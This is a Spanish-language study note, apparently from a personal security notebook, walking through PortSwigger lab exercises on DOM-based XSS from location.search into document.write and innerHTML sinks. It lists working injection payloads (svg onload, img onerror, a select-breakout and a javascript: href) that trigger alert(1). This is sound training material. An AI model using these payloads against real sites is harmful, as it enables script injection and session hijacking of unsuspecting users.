---
aliases:
  - XSS 003 - DOM XSS source a sink
  - dom xss sink location.search
tags:
  - vuln/xss
  - example
  - portswigger
---

# 003 — DOM XSS: seguir source → sink

> Lab: [DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink) · [DOM XSS in innerHTML sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink) · **Apprentice** · técnica → [[vulnerabilities/002-xss/README|entry point]]

## ¿Por qué acá? (el payload lo dispara el JS del cliente)
- **No hay reflejo en el HTML del server:** el input entra por un **source** (`location.search`, `location.hash`) y el **JS del cliente** lo mete en un **sink** peligroso (`document.write`, `innerHTML`). Seguí siempre **source → sink**.
- El **sink decide el payload:** `innerHTML` **no ejecuta `<script>`** → obliga a un event handler. Usá **DOM Invader** para localizar el sink.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = tu payload en el parámetro que alimenta el source.

**Sink `document.write`** (el término va dentro de un `<img src>`) → cerrar el atributo y meter un tag:
<pre class="payload"><code><mark>"&gt;&lt;svg onload=alert(1)&gt;</mark></code></pre>
**Sink `innerHTML`** (no corre `<script>`) → event handler:
<pre class="payload"><code><mark>&lt;img src=1 onerror=alert(1)&gt;</mark></code></pre>
**Dentro de un `<select>`** (stock checker) → escapar primero el contenedor:
<pre class="payload"><code><mark>"&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</mark></code></pre>

## Verificación
El `alert` salta al cargar la página con tu parámetro. Confirmá en las DevTools / DOM Invader que tu input llega **literal** al sink (no sanitizado).

## Detalles que se pasan por alto
- **`innerHTML` vs `document.write`:** con `innerHTML` **nunca** uses `<script>`; siempre `onerror`/`onload`.
- Si el sink es un **atributo `href` de jQuery** (`attr('href',...)`) → protocolo `javascript:alert(1)`.
- Si depende de `location.hash` + evento (`hashchange`), hay que **entregarlo por iframe** que cambie el hash → ver [[vulnerabilities/002-xss/ejemplo-iframe.html|ejemplo-iframe.html]].

→ Siguiente: [[vulnerabilities/002-xss/examples/004-httponly-leer-csrf-token-actuar|004 · HttpOnly: leer el CSRF token y actuar como la víctima]]
